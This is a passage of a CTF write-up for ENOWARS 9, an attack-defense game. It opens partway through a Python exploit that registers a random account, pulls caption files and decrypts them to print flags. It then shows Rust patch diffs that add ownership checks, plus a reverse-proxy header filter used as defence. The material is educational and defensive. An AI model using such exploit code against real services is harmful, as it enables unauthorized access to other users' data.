</span></span><span class="line"><span class="cl">    <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">alph</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">12</span><span class="p">)),</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">alph</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">12</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/newuser&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/checkcredentials&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/get_shorts&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="n">vtt_file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">c</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="s1">&#39;caption_path&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">c</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">vtt_raw</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
</span></span><span class="line"><span class="cl">        <span class="n">encrypted</span> <span class="o">=</span> <span class="n">extract_vtt_text</span><span class="p">(</span><span class="n">vtt_raw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">durations</span> <span class="o">=</span> <span class="p">[</span><span class="mf">4.6</span><span class="p">,</span> <span class="mf">2.5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">durations</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span> <span class="o">=</span> <span class="n">decrypt_spanish_stream</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">words_file</span><span class="o">=</span><span class="s2">&#34;spanish_words.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">f</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">)</span> <span class="ow">and</span> <span class="n">f</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">brainfuck</span><span class="p">(</span><span class="n">f</span><span class="p">),</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="patches">Patches<a hidden class="anchor" aria-hidden="true" href="#patches">#</a></h3>
<p>The staged git changes show that the Broken Access Control vulnerability was patched in <code>backend/src/main.rs</code>.</p>
<ol>
<li>
<p><strong>Patch for Private Video Access</strong>: The <code>get_private_videos_by_userid</code> function was modified to include a crucial authorization check. It now compares the <code>user_id</code> from the session with the <code>user_id</code> from the URL. If they do not match, the request is rejected.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gd">--- a/backend/src/main.rs
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/backend/src/main.rs
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -654,8 +654,11 @@ async fn get_private_videos_by_userid(
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>     pool: web::Data&lt;Pool&gt;,
</span></span><span class="line"><span class="cl">     user_id: web::Path&lt;i32&gt;,
</span></span><span class="line"><span class="cl"> ) -&gt; Result&lt;impl Responder, Error&gt; {
</span></span><span class="line"><span class="cl">     if let Ok(Some(_user_id)) = session.get::&lt;i32&gt;(&#34;user_id&#34;) {
</span></span><span class="line"><span class="cl"><span class="gd">-        let conn = get_db_conn(&amp;pool).await?;
</span></span></span><span class="line"><span class="cl"><span class="gd"></span>         let user_id = user_id.into_inner();
</span></span><span class="line"><span class="cl"><span class="gi">+        if _user_id != user_id {
</span></span></span><span class="line"><span class="cl"><span class="gi">+            return Ok(redirect!(&#34;/no_permission&#34;));
</span></span></span><span class="line"><span class="cl"><span class="gi">+        }
</span></span></span><span class="line"><span class="cl"><span class="gi">+        let conn = get_db_conn(&amp;pool).await?;
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>         let videoss = web::block(move || select_private_videos_by_userid(conn, user_id))
</span></span><span class="line"><span class="cl">             .await?
</span></span><span class="line"><span class="cl">             .map_err(error::ErrorInternalServerError)?;
</span></span></code></pre></div></li>
<li>
<p><strong>Defense-in-Depth for Video Info</strong>: A similar check was added to the <code>/get_video_info/{path:.*}</code> endpoint. This patch ensures that only the owner of a video can fetch its detailed metadata, preventing potential information leaks even if an attacker found another way to access a video path.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gd">--- a/backend/src/main.rs
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/backend/src/main.rs
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -738,6 +741,9 @@ async fn get_video_info(
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>         let video_info = web::block(move || select_video_by_path(conn, &amp;path))
</span></span><span class="line"><span class="cl">             .await?
</span></span><span class="line"><span class="cl">             .map_err(error::ErrorInternalServerError)?;
</span></span><span class="line"><span class="cl"><span class="gi">+            if video_info.userId != user_id {
</span></span></span><span class="line"><span class="cl"><span class="gi">+                return Ok(redirect!(&#34;/no_permission&#34;));
</span></span></span><span class="line"><span class="cl"><span class="gi">+            }
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>         Ok(HttpResponse::Ok().json(video_info))
</span></span><span class="line"><span class="cl">     }
</span></span><span class="line"><span class="cl"> } else {
</span></span></code></pre></div></li>
</ol>
<p>No patches were found in the staged changes for the insecure cryptography vulnerability in the shorts captioning system. This suggests the vulnerability might have been overlooked or was intended to be patched in a different commit.</p>
<h3 id="network-level-defense">Network-level Defense<a hidden class="anchor" aria-hidden="true" href="#network-level-defense">#</a></h3>
<p>In addition to the code-level patches, we implemented a network-level defense. We configured our reverse proxy to inspect incoming HTTP requests. By identifying the specific <code>User-Agent</code> and other headers used by the game&rsquo;s checker, we created a filtering rule. Any request to the service that did not match the checker&rsquo;s header profile was blocked. This effectively mitigated simple scripted attacks and forced adversaries to craft more sophisticated exploits that correctly mimicked the checker&rsquo;s traffic, as demonstrated by the <code>User-Agent</code> header present in the provided exploit scripts.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://albovo.github.io/en/tags/attack-defense/">Attack-Defense</a></li>
      <li><a href="https://albovo.github.io/en/tags/ctf/">Ctf</a></li>
      <li><a href="https://albovo.github.io/en/tags/crypto/">Crypto</a></li>
      <li><a href="https://albovo.github.io/en/tags/web/">Web</a></li>
      <li><a href="https://albovo.github.io/en/tags/enowars/">Enowars</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://albovo.github.io/en/ctf/scriptctf2025/">
    <span class="title">¬´ Prev</span>
    <br>
    <span>scriptCTF 2025</span>
  </a>
  <a class="next" href="https://albovo.github.io/en/ctf/ulissectf2025/">
    <span class="title">Next ¬ª</span>
    <br>
    <span>UlisseCTF 2025</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on x"
            href="https://x.com/intent/tweet/?text=ENOWARS%209&amp;url=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fenowars2025%2f&amp;hashtags=attack-defense%2cctf%2ccrypto%2cweb%2cenowars">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fenowars2025%2f&amp;title=ENOWARS%209&amp;summary=ENOWARS%209&amp;source=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fenowars2025%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on reddit"
            href="https://reddit.com/submit?url=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fenowars2025%2f&title=ENOWARS%209">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on facebook"
            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fenowars2025%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on whatsapp"
            href="https://api.whatsapp.com/send?text=ENOWARS%209%20-%20https%3a%2f%2falbovo.github.io%2fen%2fctf%2fenowars2025%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on telegram"
            href="https://telegram.me/share/url?text=ENOWARS%209&amp;url=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fenowars2025%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=ENOWARS%209&u=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fenowars2025%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://albovo.github.io/en/">Portfolio</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
